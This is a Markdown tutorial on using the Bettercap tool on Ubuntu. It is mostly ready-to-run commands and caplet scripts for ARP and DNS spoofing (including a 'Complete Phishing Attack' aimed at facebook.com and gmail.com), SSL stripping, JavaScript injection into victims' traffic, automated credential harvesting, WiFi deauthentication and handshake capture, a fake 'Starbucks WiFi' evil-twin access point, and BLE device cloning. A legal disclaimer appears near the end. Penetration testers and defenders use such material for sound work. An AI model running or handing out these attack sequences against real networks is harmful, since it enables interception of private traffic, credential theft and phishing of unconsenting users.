# Comprehensive Bettercap Guide for Ubuntu Linux

## Table of Contents
1. [Installation](#installation)
2. [Basic Usage](#basic-usage)
3. [Network Discovery](#network-discovery)
4. [ARP Spoofing and MITM](#arp-spoofing-and-mitm)
5. [DNS Spoofing](#dns-spoofing)
6. [HTTP/HTTPS Proxy](#httphttps-proxy)
7. [Packet Sniffing](#packet-sniffing)
8. [WiFi Attacks](#wifi-attacks)
9. [Bluetooth Low Energy (BLE)](#bluetooth-low-energy-ble)
10. [GPS Module](#gps-module)
11. [Caplets (Scripts)](#caplets-scripts)
12. [Web UI](#web-ui)
13. [REST API](#rest-api)
14. [Events and Logging](#events-and-logging)
15. [Practical Examples](#practical-examples)

---

## Installation

### Install from Package Manager
```bash
# Update package list
sudo apt update

# Install bettercap
sudo apt install bettercap

# Verify installation
bettercap -version
```

### Install from Source (Latest Version)
```bash
# Install Go (if not already installed)
sudo apt install golang-go

# Install build dependencies
sudo apt install build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev

# Install bettercap
go install github.com/bettercap/bettercap@latest

# Move to system path
sudo mv ~/go/bin/bettercap /usr/local/bin/

# Install web UI (optional)
sudo bettercap -eval "caplets.update; ui.update; q"

# Verify installation
bettercap -version
```

### Install Additional Tools
```bash
# Install network tools
sudo apt install net-tools wireless-tools aircrack-ng

# Install for HTTPS proxy
sudo apt install ca-certificates

# Set capabilities for non-root execution (optional)
sudo setcap cap_net_raw,cap_net_admin=eip /usr/local/bin/bettercap
```

---

## Basic Usage

### Starting Bettercap
```bash
# Start interactive shell
sudo bettercap

# Start with specific interface
sudo bettercap -iface eth0

# Start with web UI
sudo bettercap -caplet http-ui

# Execute commands and exit
sudo bettercap -eval "net.probe on; sleep 5; net.show; exit"

# Silent mode (no banner)
sudo bettercap -silent

# Debug mode
sudo bettercap -debug

# Start with caplet
sudo bettercap -caplet mycaplet.cap
```

### Interactive Shell Commands
```bash
# Help
help

# Show available modules
help modules

# Get help for specific module
help net.probe

# Show current status
active

# Exit
exit
# OR
q
# OR
quit
```

### Interface Management
```bash
# Set interface
set iface wlan0

# Get interface info
get iface

# Show interface statistics
net.stats

# Show all settings
get *

# Clear terminal
clear
```

---

## Network Discovery

### Network Recon Module
```bash
# Start network discovery
net.recon on

# Stop network discovery
net.recon off

# Show discovered hosts
net.show

# Show hosts with details
net.show -details

# Probe network for hosts
net.probe on

# Stop probing
net.probe off

# Set probe throttle (delay between probes)
set net.probe.throttle 10

# Show specific host
net.show 192.168.1.1

# Clear discovered hosts
net.clear
```

### Advanced Discovery
```bash
# Start with specific probe
net.probe on
sleep 10
net.show

# Continuous monitoring
» net.recon on
» net.probe on

# Filter by vendor
net.show | grep Apple

# Export hosts
net.show > hosts.txt
```

### Host Properties
```bash
# Get host info
» get gateway
» get ipv4
» get ipv6
» get mac

# Show network statistics
net.stats
```

---

## ARP Spoofing and MITM

### Basic ARP Spoofing
```bash
# Set target(s)
set arp.spoof.targets 192.168.1.50

# Set full subnet as target
set arp.spoof.targets 192.168.1.0/24

# Exclude specific hosts
set arp.spoof.exclude 192.168.1.1,192.168.1.2

# Enable ARP spoofing
arp.spoof on

# Stop ARP spoofing
arp.spoof off

# Ban target(s) (no traffic)
arp.ban on

# Unban
arp.ban off
```

### Advanced ARP Spoofing
```bash
# Spoof specific target and gateway
» set arp.spoof.targets 192.168.1.50
» set arp.spoof.fullduplex true
» set arp.spoof.internal false
» arp.spoof on

# Internal ARP spoofing (between two local hosts)
» set arp.spoof.targets 192.168.1.50,192.168.1.60
» set arp.spoof.internal true
» arp.spoof on

# Custom ARP refresh interval
set arp.spoof.interval 1

# Enable IP forwarding
set net.forwarding true
```

### Complete MITM Setup
```bash
# 1. Enable packet forwarding
» set net.forwarding true

# 2. Start network discovery
» net.probe on

# 3. Set target
» set arp.spoof.targets 192.168.1.50

# 4. Start ARP spoofing
» arp.spoof on

# 5. Start packet sniffer
» net.sniff on

# 6. Optional: Start HTTP/HTTPS proxy
» set http.proxy.sslstrip true
» http.proxy on
» https.proxy on
```

---

## DNS Spoofing

### Basic DNS Spoofing
```bash
# Set DNS server to spoof
set dns.spoof.address 192.168.1.100

# Spoof all domains to same IP
set dns.spoof.all true

# Add specific domain
set dns.spoof.domains example.com

# Add multiple domains
set dns.spoof.domains example.com,test.com,*.google.com

# Start DNS spoofing
dns.spoof on

# Stop DNS spoofing
dns.spoof off
```

### Advanced DNS Spoofing
```bash
# Custom DNS responses file
echo "example.com 192.168.1.100" > hosts.txt
echo "*.test.com 192.168.1.101" >> hosts.txt
set dns.spoof.hosts hosts.txt
dns.spoof on

# Spoof specific domains to different IPs
» set dns.spoof.domains facebook.com,twitter.com
» set dns.spoof.address 192.168.1.100
» dns.spoof on

# Wildcard spoofing
» set dns.spoof.domains *.google.com
» set dns.spoof.address 192.168.1.100
» dns.spoof on
```

### DNS + ARP Spoofing Combo
```bash
# Complete phishing setup
» set net.forwarding true
» net.probe on
» set arp.spoof.targets 192.168.1.0/24
» set dns.spoof.domains facebook.com,gmail.com
» set dns.spoof.address 192.168.1.100
» arp.spoof on
» dns.spoof on
» net.sniff on
```

---

## HTTP/HTTPS Proxy

### HTTP Proxy
```bash
# Start HTTP proxy
http.proxy on

# Stop HTTP proxy
http.proxy off

# Set proxy port
set http.proxy.port 8080

# Set proxy address
set http.proxy.address 0.0.0.0

# Inject JavaScript
set http.proxy.script /path/to/script.js

# Proxy with SSL stripping
set http.proxy.sslstrip true
http.proxy on
```

### HTTPS Proxy
```bash
# Start HTTPS proxy
https.proxy on

# Stop HTTPS proxy
https.proxy off

# Set HTTPS proxy port
set https.proxy.port 8083

# Inject script into HTTPS
set https.proxy.script /path/to/script.js
```

### SSL Stripping
```bash
# Enable SSL strip
set http.proxy.sslstrip true

# Certificate spoofing
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### JavaScript Injection
```bash
# Create injection script
cat > inject.js << 'EOF'
console.log("Injected by bettercap");
alert("Warning: You are being monitored!");
EOF

# Use injection
» set http.proxy.script inject.js
» http.proxy on
```

### Request/Response Modification
```bash
# Using a proxy script
cat > modify.js << 'EOF'
function onRequest(req, res) {
    console.log(req.Method + " " + req.URL);
    // Modify request headers
    req.Headers["User-Agent"] = ["CustomUA"];
}

function onResponse(req, res) {
    // Modify response
    if (res.ContentType.indexOf("text/html") >= 0) {
        res.Body = res.Body.replace(/password/g, "***");
    }
}
EOF

» set http.proxy.script modify.js
» http.proxy on
```

---

## Packet Sniffing

### Basic Sniffing
```bash
# Start packet sniffer
net.sniff on

# Stop packet sniffer
net.sniff off

# Show sniffer statistics
net.sniff.stats

# Set output file
set net.sniff.output capture.pcap

# Verbose output
set net.sniff.verbose true

# Local packets only
set net.sniff.local true
```

### Protocol-Specific Sniffing
```bash
# HTTP/HTTPS credentials
set net.sniff.verbose true
set net.sniff.local false
set net.sniff.filter "tcp port 80 or tcp port 443"
net.sniff on

# FTP credentials
set net.sniff.filter "tcp port 21"
net.sniff on

# SMTP/POP3/IMAP
set net.sniff.filter "tcp port 25 or tcp port 110 or tcp port 143"
net.sniff on

# DNS queries
set net.sniff.filter "udp port 53"
net.sniff on

# Custom BPF filter
set net.sniff.filter "tcp and (port 80 or port 443)"
net.sniff on
```

### Advanced Sniffing
```bash
# Regex filtering
set net.sniff.regexp ".*password.*"
net.sniff on

# Save to PCAP
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
» # ... capture traffic ...
» net.sniff off

# Parse saved PCAP
net.sniff.load /tmp/capture.pcap
```

### Cookie Sniffing
```bash
# Capture cookies
» set net.sniff.verbose true
» net.sniff on
# Look for "Cookie:" headers in output
```

---

## WiFi Attacks

### WiFi Monitoring
```bash
# Set WiFi interface to monitor mode
wifi.recon on

# Stop monitor mode
wifi.recon off

# Show detected APs
wifi.show

# Show specific AP
wifi.show [BSSID]

# Clear APs
wifi.clear

# Set channel
set wifi.recon.channel 6

# Hop between channels
set wifi.hop.channels 1,2,3,4,5,6,7,8,9,10,11
set wifi.hop.interval 250
```

### Deauthentication Attack
```bash
# Deauth specific client from AP
wifi.deauth [AP_BSSID] [CLIENT_BSSID]

# Deauth all clients from AP
wifi.deauth [AP_BSSID]

# Deauth with custom reason code
set wifi.deauth.reason 7
wifi.deauth [AP_BSSID]

# Skip self deauth
set wifi.deauth.skip_self true
```

### WPA/WPA2 Handshake Capture
```bash
# 1. Start monitoring
wifi.recon on

# 2. Wait for clients to appear
wifi.show

# 3. Deauth to force handshake
wifi.deauth [AP_BSSID]

# 4. Check for captured handshakes
wifi.show
# Look for "handshake" indicator

# 5. Save to file
set wifi.handshakes.file /tmp/handshakes/
```

### Fake AP (Evil Twin)
```bash
# Create fake AP
set wifi.ap.ssid "Free WiFi"
set wifi.ap.bssid [MAC_ADDRESS]
set wifi.ap.channel 6
set wifi.ap.encryption false
wifi.recon off
wifi.ap on
```

### WiFi Enumeration
```bash
# Scan for APs
wifi.recon on
sleep 30
wifi.show

# Filter by vendor
wifi.show | grep Cisco

# Show clients
» wifi.recon on
» wifi.show
# Clients listed under each AP

# Association attack (forces client reconnect)
wifi.assoc [AP_BSSID] [CLIENT_BSSID]
```

---

## Bluetooth Low Energy (BLE)

### BLE Discovery
```bash
# Start BLE discovery
ble.recon on

# Stop BLE discovery
ble.recon off

# Show discovered devices
ble.show

# Clear devices
ble.clear

# Show specific device
ble.show [MAC]
```

### BLE Enumeration
```bash
# Enumerate services and characteristics
ble.enum [MAC]

# Write to characteristic
ble.write [MAC] [UUID] [HEX_DATA]

# Read from characteristic (if readable)
# This is done automatically during enumeration
```

### BLE Attacks
```bash
# Clone device
» ble.recon on
» # Wait for device
» ble.show [TARGET_MAC]
» set ble.clone.target [TARGET_MAC]
» ble.clone on

# Fuzzing
# Create custom caplet for fuzzing
```

---

## GPS Module

### GPS Tracking
```bash
# Start GPS
gps on

# Stop GPS
gps off

# Show current GPS data
gps.show

# Set GPS device
set gps.device /dev/ttyUSB0

# Set baud rate
set gps.baudrate 9600
```

---

## Caplets (Scripts)

### Using Caplets
```bash
# List available caplets
caplets.show

# Update caplets from GitHub
caplets.update

# Run caplet
caplets [CAPLET_NAME]

# Run custom caplet
caplets /path/to/custom.cap

# Load from command line
sudo bettercap -caplet http-ui
```

### Creating Custom Caplets
```bash
# Create a simple caplet
cat > mycaplet.cap << 'EOF'
# My Custom Caplet
set net.forwarding true
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on
set net.sniff.verbose true
EOF

# Run it
sudo bettercap -caplet mycaplet.cap
```

### Popular Built-in Caplets
```bash
# HTTP/HTTPS UI
caplets http-ui

# HTTPS UI
caplets https-ui

# Comprehensive MITM
caplets mitm

# Credentials sniffer
caplets sniffer

# Simple ARP spoof
caplets arp-spoof

# Network discovery
caplets recon

# Passive network monitoring
caplets passive-recon
```

### Advanced Caplet Example
```bash
cat > advanced-mitm.cap << 'EOF'
# Advanced MITM Attack Caplet
set net.forwarding true
set net.sniff.verbose true
set net.sniff.local false
set net.sniff.filter "tcp port 80 or tcp port 443"

# ARP spoofing configuration
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.exclude 192.168.1.1

# DNS spoofing
set dns.spoof.domains facebook.com,twitter.com
set dns.spoof.address 192.168.1.100

# HTTP proxy
set http.proxy.sslstrip true
set http.proxy.script inject.js

# Start modules
net.probe on
arp.spoof on
dns.spoof on
http.proxy on
net.sniff on

# Log events
events.stream on
EOF
```

---

## Web UI

### Starting Web UI
```bash
# Start with HTTP UI
sudo bettercap -caplet http-ui

# Start with HTTPS UI
sudo bettercap -caplet https-ui

# Custom UI settings
» set http.server.port 8080
» set http.server.address 0.0.0.0
» set http.server.path /usr/local/share/bettercap/ui
» http.server on

# Access UI
# Open browser to http://localhost:80
# Default credentials: user: user, pass: pass
```

### UI Configuration
```bash
# Change credentials
» set http.server.username admin
» set http.server.password newpassword

# Enable SSL
» https.server on

# Custom certificate
» set https.server.certificate /path/to/cert.pem
» set https.server.key /path/to/key.pem
```

---

## REST API

### Starting API Server
```bash
# Start API server
api.rest on

# Stop API server
api.rest off

# Set API port
set api.rest.port 8081

# Set API address
set api.rest.address 0.0.0.0

# Authentication
set api.rest.username admin
set api.rest.password secret
```

### API Endpoints
```bash
# Using curl to interact with API

# Get session info
curl -u admin:secret http://localhost:8081/api/session

# Get events
curl -u admin:secret http://localhost:8081/api/events

# Get hosts
curl -u admin:secret http://localhost:8081/api/session/lan

# Execute command
curl -u admin:secret -X POST \
  -H "Content-Type: application/json" \
  -d '{"cmd":"net.probe on"}' \
  http://localhost:8081/api/session

# Clear events
curl -u admin:secret -X DELETE \
  http://localhost:8081/api/events
```

---

## Events and Logging

### Event Stream
```bash
# Start event stream
events.stream on

# Stop event stream
events.stream off

# Clear events
events.clear

# Ignore specific events
events.ignore endpoint
events.ignore wifi.ap.new

# Show events
events.show

# Filter events
events.show | grep "http.req"
```

### Event Types
```bash
# Common events:
# - endpoint.new (new host discovered)
# - endpoint.lost (host went offline)
# - wifi.ap.new (new AP discovered)
# - wifi.client.probe (client probe request)
# - wifi.client.handshake (WPA handshake captured)
# - http.req (HTTP request)
# - https.req (HTTPS request)
# - net.sniff.http.request
# - net.sniff.http.response
# - arp.spoof.track
```

### Logging
```bash
# Set log file
set log.output /tmp/bettercap.log

# Set log debug level
set log.debug true

# Rotate logs
set log.rotate true
set log.rotate.size 10485760
set log.rotate.compress true
```

---

## Practical Examples

### Example 1: Simple Network Discovery
```bash
sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; net.show; exit"
```

### Example 2: MITM with Credential Sniffing
```bash
# Start bettercap
sudo bettercap

# Commands:
» set net.forwarding true
» net.probe on
» set arp.spoof.targets 192.168.1.50
» arp.spoof on
» set net.sniff.verbose true
» net.sniff on
```

### Example 3: Complete Phishing Attack
```bash
# Create caplet
cat > phishing.cap << 'EOF'
set net.forwarding true
set arp.spoof.targets 192.168.1.0/24
set dns.spoof.domains facebook.com
set dns.spoof.address 192.168.1.100

net.probe on
arp.spoof on
dns.spoof on
net.sniff on
EOF

# Run
sudo bettercap -caplet phishing.cap
```

### Example 4: WiFi Handshake Capture
```bash
sudo bettercap

# Commands:
» set wifi.handshakes.file /tmp/handshakes/
» wifi.recon on
» # Wait for targets to appear
» wifi.show
» # Deauth clients to force handshake
» wifi.deauth [TARGET_BSSID]
» # Wait for handshake capture
» wifi.show
```

### Example 5: Evil Twin Access Point
```bash
cat > evil-twin.cap << 'EOF'
# Configure fake AP
set wifi.ap.ssid "Starbucks WiFi"
set wifi.ap.channel 6
set wifi.ap.encryption false

# DNS spoofing to redirect traffic
set dns.spoof.all true
set dns.spoof.address 192.168.1.100

wifi.recon off
wifi.ap on
dns.spoof on
http.proxy on
net.sniff on
EOF

sudo bettercap -caplet evil-twin.cap
```

### Example 6: Automated Credential Harvesting
```bash
cat > harvest.cap << 'EOF'
set net.forwarding true
set net.sniff.verbose true
set net.sniff.local false
set net.sniff.filter "tcp and (port 21 or port 23 or port 110 or port 143)"
set net.sniff.output /tmp/credentials.pcap

net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on

events.stream on
events.ignore endpoint
EOF

sudo bettercap -caplet harvest.cap
```

### Example 7: HTTPS Downgrade Attack
```bash
cat > sslstrip.cap << 'EOF'
set net.forwarding true
set http.proxy.sslstrip true
set http.proxy.script inject.js

net.probe on
set arp.spoof.targets 192.168.1.50
arp.spoof on
http.proxy on
https.proxy on
net.sniff on
EOF

sudo bettercap -caplet sslstrip.cap
```

### Example 8: Bluetooth Scanner
```bash
# Scan for BLE devices
sudo bettercap -eval "ble.recon on; sleep 30; ble.show; exit"
```

### Example 9: Network Monitoring Dashboard
```bash
# Start web UI with all monitoring
cat > monitor.cap << 'EOF'
set http.server.username admin
set http.server.password monitor123

net.probe on
net.recon on
wifi.recon on
ble.recon on

events.stream on
http.server on
EOF

sudo bettercap -caplet monitor.cap
# Access http://localhost
```

### Example 10: Scripted MITM with Notification
```bash
cat > alert-mitm.cap << 'EOF'
set net.forwarding true
set arp.spoof.targets 192.168.1.50

net.probe on
arp.spoof on

# Set up event handler
events.on "net.sniff.http.request" {
    log.info "HTTP Request: %s %s", event.data.method, event.data.url
}

net.sniff on
events.stream on
EOF

sudo bettercap -caplet alert-mitm.cap
```

---

## Tips and Best Practices

### 1. Use Caplets for Automation
Save frequently used command sequences as caplets for quick execution.

### 2. Monitor in Passive Mode First
```bash
# Start with passive monitoring
» net.recon on
» net.probe on
» net.sniff on
# Observe traffic before launching attacks
```

### 3. Backup Configuration
```bash
# Save current configuration
get * > backup.conf

# Restore settings
source backup.conf
```

### 4. Use Web UI for Visualization
The web UI provides better visualization of network activity than CLI.

### 5. Enable Packet Forwarding
```bash
# Always enable for MITM
set net.forwarding true
```

### 6. Filter Sniffed Traffic
```bash
# Use BPF filters to reduce noise
set net.sniff.filter "tcp and not port 22"
```

### 7. Update Regularly
```bash
# Update caplets
caplets.update

# Update web UI
ui.update

# Update bettercap itself
sudo apt update && sudo apt upgrade bettercap
```

### 8. Use Appropriate Timing
```bash
# For stealth, use slower intervals
set arp.spoof.interval 5
set wifi.hop.interval 500
```

### 9. Log Everything
```bash
# Enable comprehensive logging
set log.output /tmp/bettercap.log
set log.debug true
events.stream on
```

### 10. Test in Isolated Environment
Always test in a controlled lab environment before using in production.

---

## Module Reference

### Core Modules
- **net.recon**: Network reconnaissance
- **net.probe**: Active host discovery
- **net.sniff**: Packet sniffing
- **arp.spoof**: ARP spoofing
- **dns.spoof**: DNS spoofing
- **dhcp6.spoof**: DHCPv6 spoofing

### Proxy Modules
- **http.proxy**: HTTP transparent proxy
- **https.proxy**: HTTPS transparent proxy
- **http.server**: HTTP server (for UI)
- **https.server**: HTTPS server

### Wireless Modules
- **wifi.recon**: WiFi monitoring
- **wifi.ap**: Fake access point
- **ble.recon**: Bluetooth LE scanning

### Other Modules
- **api.rest**: REST API server
- **events**: Event system
- **gps**: GPS tracking
- **ticker**: Scheduled commands
- **caplets**: Script management
- **mac.changer**: MAC address spoofing

---

## Common Port and Protocol Reference

### Credential Sniffing Targets
- **21**: FTP (clear text)
- **23**: Telnet (clear text)
- **25**: SMTP
- **80**: HTTP
- **110**: POP3 (clear text)
- **143**: IMAP
- **443**: HTTPS
- **3306**: MySQL
- **5432**: PostgreSQL

### Common WiFi Channels
- **2.4 GHz**: 1-11 (US), 1-13 (EU), 1-14 (JP)
- **5 GHz**: 36, 40, 44, 48, 149, 153, 157, 161, 165

---

## Troubleshooting

### Interface Issues
```bash
# Check available interfaces
ip link show

# Bring interface up
sudo ip link set wlan0 up

# Kill conflicting processes
sudo airmon-ng check kill

# Reset interface
sudo ip link set wlan0 down
sudo ip link set wlan0 up
```

### Permission Issues
```bash
# Run as root
sudo bettercap

# Set capabilities
sudo setcap cap_net_raw,cap_net_admin=eip /usr/local/bin/bettercap
```

### Module Not Starting
```bash
# Check dependencies
» get [module.name].*

# Enable debug mode
» set log.debug true

# Check interface
» get iface
```

### No Packets Captured
```bash
# Verify forwarding
» get net.forwarding

# Check ARP spoofing status
» arp.spoof.stats

# Verify target is set
» get arp.spoof.targets
```

---

## Legal Disclaimer

**CRITICAL WARNING**: Bettercap is a powerful penetration testing tool. Unauthorized use of this tool against networks, systems, or devices you do not own or have explicit written permission to test is **ILLEGAL** and **UNETHICAL**.

### Legal Considerations:
1. **Only use on networks you own or have written authorization to test**
2. **Unauthorized network interception is a crime in most jurisdictions**
3. **Man-in-the-middle attacks without consent are illegal**
4. **WiFi attacks may violate Computer Fraud and Abuse Act (CFAA) and similar laws**
5. **You are responsible for all consequences of using this tool**

### Ethical Guidelines:
- Obtain written permission before testing any network
- Use in authorized penetration testing engagements only
- Never access, intercept, or modify traffic without authorization
- Document all testing activities
- Report findings responsibly
- Respect privacy and confidentiality

**By using bettercap, you agree to use it only for lawful purposes and take full responsibility for your actions.**

---

## Additional Resources

### Official Resources
- **Website**: https://www.bettercap.org/
- **Documentation**: https://www.bettercap.org/usage/
- **GitHub**: https://github.com/bettercap/bettercap
- **Caplets Repository**: https://github.com/bettercap/caplets

### Community Resources
- **Discord**: https://discord.gg/bettercap
- **Twitter**: @bettercap
- **YouTube**: Search for "bettercap tutorials"

### Related Tools
- **Wireshark**: Network protocol analyzer
- **Nmap**: Network scanner
- **Aircrack-ng**: WiFi security toolkit
- **Ettercap**: Network security tool
- **MITMf**: Framework for MITM attacks

### Learning Resources
- Practice in isolated lab environments
- Use virtual machines for testing
- Set up your own vulnerable network
- Read penetration testing books and courses
- Join ethical hacking communities

---

## Keyboard Shortcuts

### Interactive Shell
- **Ctrl+C**: Stop current module
- **Ctrl+D**: Exit bettercap
- **Tab**: Auto-complete
- **Up/Down arrows**: Command history
- **Ctrl+R**: Search command history
- **Ctrl+L**: Clear screen

---

## Environment Variables

```bash
# Set default interface
export BETTERCAP_IFACE=eth0

# Set caplet path
export CAPSPATH=/usr/local/share/bettercap/caplets

# Set UI path
export UIPATH=/usr/local/share/bettercap/ui
```

---

## Quick Reference Commands

```bash
# Discovery
net.probe on
wifi.recon on
ble.recon on

# MITM Attack
set arp.spoof.targets [TARGET]
arp.spoof on

# Sniffing
net.sniff on

# Spoofing
dns.spoof on

# Proxy
http.proxy on
https.proxy on

# Web UI
http.server on

# Status
active
net.show
wifi.show
ble.show

# Help
help
help [module]
```

---

**Remember**: With great power comes great responsibility. Use bettercap ethically and legally.
